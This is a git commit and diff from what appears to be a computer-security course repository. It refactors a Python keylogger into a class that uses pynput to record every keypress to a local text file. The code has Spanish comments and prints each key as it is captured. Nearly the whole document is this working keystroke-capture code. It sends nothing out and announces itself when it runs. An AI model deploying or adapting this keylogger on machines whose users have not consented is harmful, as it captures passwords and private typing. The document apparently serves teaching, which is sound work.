6496e19b1f03ba71649da4eeb3a39d0965fc55f2
Jordi Serrano <44474715+j0rd1s3rr4n0@users.noreply.github.com>
2023-12-06 23:51:55 +0100

    Update Seguretat Informàtica_Annex9.py
    This commit updates the 'Seguretat Informàtica_Annex9.py' script to improve the keylogger implementation. The code has been refactored to utilize a class-based approach, enhancing modularity and readability. Keylogger functionality is now encapsulated within the 'KeyLogger' class, offering methods to start and stop the keylogging process. Additionally, error handling has been improved to handle unexpected situations more gracefully. The script now provides informative messages during keylogger initiation, interruption, and termination. The main function has been enhanced to ensure proper resource cleanup, and the code is structured to be more user-friendly.

--- Seguretat Informàtica_Annex9.py
+++ Seguretat Informàtica_Annex9.py
@@ -1,25 +1,85 @@
 import datetime
-from pynput.keyboard import Listener
+from pynput import keyboard
 
-#f = open("sources/keylogger.txt","w")
+class KeyLogger:
+    def __init__(self, output_file="sources/keylogger.txt"):
+        self.output_file = output_file
+        self.file_handle = None
+        self.listener = None
 
-def key_recorder(key):
-	key=str(key)
+    def start_logging(self):
+        try:
+            # Abre el archivo en modo de escritura y manejo de texto
+            self.file_handle = open(self.output_file, "w")
 
-	print(key)
+            # Inicia el Listener para detectar las pulsaciones de teclas
+            self.listener = keyboard.Listener(on_press=self.key_recorder)
+            self.listener.start()
 
-#	if key == "'\\x03'":
-#		f.close()
-#		quit()
-#	elif key == 'Key.enter':
-#		f.write("\n")
-#	elif key == 'Key.space':
-#		f.write(" ")
-#	elif key == 'Key.backspace':
-#		f.write('%BORRAR%')
-#	else:
-#		f.write(key.replace("'",""))
+            print("Keylogger iniciado. Presiona Ctrl+C para detener.")
+        except Exception as e:
+            print(f"Error al iniciar el keylogger: {e}")
+            self.stop_logging()
 
-with Listener(on_press=key_recorder) as l:
-	l.join()
+    def stop_logging(self):
+        try:
+            # Detiene y espera a que el Listener termine
+            if self.listener:
+                self.listener.stop()
+                self.listener.join()
 
+            # Cierra el archivo
+            if self.file_handle:
+                self.file_handle.close()
+
+            print("Keylogger detenido.")
+        except Exception as e:
+            print(f"Error al detener el keylogger: {e}")
+
+    def key_recorder(self, key):
+        try:
+            key = str(key)
+
+            # Imprime la tecla presionada
+            print(key)
+
+            # Comprueba si la tecla presionada es 'Enter' y la imprime en el archivo
+            if key == 'Key.enter':
+                self.file_handle.write("\n")
+
+            # Comprueba si la tecla presionada es 'Space' y la imprime en el archivo
+            elif key == 'Key.space':
+                self.file_handle.write(" ")
+
+            # Comprueba si la tecla presionada es 'Backspace' y la imprime en el archivo como '%BORRAR%'
+            elif key == 'Key.backspace':
+                self.file_handle.write('%BORRAR%')
+
+            # En caso contrario, imprime la tecla sin comillas en el archivo
+            else:
+                self.file_handle.write(key.replace("'", ""))
+
+        except Exception as e:
+            print(f"Error en la función key_recorder: {e}")
+            self.stop_logging()
+
+def main():
+    key_logger = KeyLogger()
+
+    try:
+        # Inicia el keylogger
+        key_logger.start_logging()
+
+        # Mantiene el script en ejecución hasta que el usuario presiona Ctrl+C
+        key_logger.listener.join()
+
+    except KeyboardInterrupt:
+        # Maneja la interrupción del usuario (Ctrl+C) de manera amigable
+        print("\nInterrupción del usuario. Deteniendo el keylogger.")
+
+    finally:
+        # Detiene el keylogger y asegura que los recursos se liberen
+        key_logger.stop_logging()
+
+if __name__ == "__main__":
+    main()
